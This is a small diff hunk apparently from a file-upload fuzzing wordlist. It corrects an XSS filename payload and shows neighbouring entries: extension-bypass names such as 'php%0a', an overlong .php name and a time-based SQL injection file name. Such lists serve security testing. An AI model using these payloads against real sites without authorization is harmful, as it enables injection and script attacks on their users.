@@ -83,4 +83,4 @@ php%0a
 php%20
 murphyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.php
 sleep(10)-- -.jpg
-<svg onload=alert(document.comain)>
+<svg onload=alert(document.domain)>.jpg
